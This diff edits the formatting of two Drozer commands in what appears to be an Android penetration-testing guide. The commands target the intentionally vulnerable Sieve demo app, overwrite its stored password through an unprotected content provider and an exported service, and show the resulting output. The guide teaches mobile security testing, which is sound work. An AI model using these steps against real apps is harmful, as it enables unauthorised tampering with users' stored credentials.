@@ -823,7 +823,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Key
 This content provider can be accessed without permission.
 
 ```shell
-dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string  Password "newpassword"
+dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password "newpassword"
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
 | Password    | pin  |
 | newpassword | 1234 |
@@ -870,7 +870,7 @@ To communicate with a service, you must first use static analysis to identify th
 Because this service is exported, you can use the module `app.service.send` to communicate with the service and change the password stored in the target application:
 
 ```shell
-dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg  6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
+dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
 Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
   what: 4
   arg1: 42
